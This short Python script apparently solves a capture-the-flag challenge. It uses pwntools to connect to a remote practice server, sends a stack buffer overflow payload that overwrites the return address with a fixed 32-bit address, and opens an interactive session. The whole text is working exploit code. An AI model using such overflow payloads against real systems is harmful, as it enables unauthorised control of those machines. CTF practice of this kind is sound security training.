from pwn import *

io = remote('node4.buuoj.cn', 25028)
payload = b'a'*(0x28+4)+p32(0x80485cb)

io.sendline(payload)
io.interactive()